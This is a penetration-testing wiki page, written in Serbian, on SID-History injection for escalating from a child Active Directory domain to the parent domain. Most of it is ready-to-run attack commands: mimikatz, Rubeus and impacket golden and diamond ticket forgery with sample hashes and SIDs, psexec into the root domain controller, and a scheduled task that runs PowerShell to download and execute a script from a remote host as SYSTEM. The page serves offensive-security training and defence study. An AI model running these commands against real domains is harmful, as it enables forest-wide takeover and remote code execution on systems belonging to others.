# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Fokus **SID History Injection Attack** je pomoć **migraciji korisnika između domena** dok se obezbeđuje nastavak pristupa resursima iz prethodne domene. To se postiže **uključivanjem prethodnog Security Identifier-a (SID) korisnika u SID History** njihovog novog naloga. Važno je napomenuti da se ovaj proces može manipulisati kako bi se omogućio neovlašćen pristup dodavanjem SID-a grupe sa visokim privilegijama (kao što su Enterprise Admins ili Domain Admins) iz matične domene u SID History. Ova eksploatacija omogućava pristup svim resursima unutar matične domene.

Postoje dve metode za izvršavanje ovog napada: kroz kreiranje **Golden Ticket** ili **Diamond Ticket**.

Da bi se odredio SID za grupu **"Enterprise Admins"**, prvo je potrebno locirati SID matične domene. Nakon identifikacije, SID grupe Enterprise Admins može se konstruisati dodavanjem `-519` na SID matične domene. Na primer, ako je SID matične domene `S-1-5-21-280534878-1496970234-700767426`, rezultantni SID za grupu "Enterprise Admins" bi bio `S-1-5-21-280534878-1496970234-700767426-519`.

Takođe možete koristiti grupe **Domain Admins**, koje se završavaju sa **512**.

Drugi način da se pronađe SID grupe iz druge domene (na primer "Domain Admins") je sa:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Zlatna ulaznica (Mimikatz) sa KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Za više informacija o zlatnim karticama proverite:

{{#ref}}
golden-ticket.md
{{#endref}}

### Dijamantska karta (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
Za više informacija o dijamantskim kartama proverite:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Povećajte privilegije na DA root ili Enterprise admin koristeći KRBTGT hash kompromitovanog domena:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Sa stečenim dozvolama iz napada možete izvršiti, na primer, DCSync napad u novoj domeni:

{{#ref}}
dcsync.md
{{#endref}}

### Iz linux-a

#### Ručno sa [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatski koristeći [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Ovo je Impacket skripta koja će **automatizovati eskalaciju sa child na parent domen**. Skripta zahteva:

- Ciljni kontroler domena
- Akreditive za admin korisnika u child domenu

Tok rada je:

- Dobija SID za grupu Enterprise Admins u parent domenu
- Preuzima hash za KRBTGT nalog u child domenu
- Kreira Zlatnu Ulaznicu
- Prijavljuje se u parent domen
- Preuzima akreditive za Administrator nalog u parent domenu
- Ako je `target-exec` prekidač specificiran, autentifikuje se na Kontroler Domena parent domena putem Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Reference

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
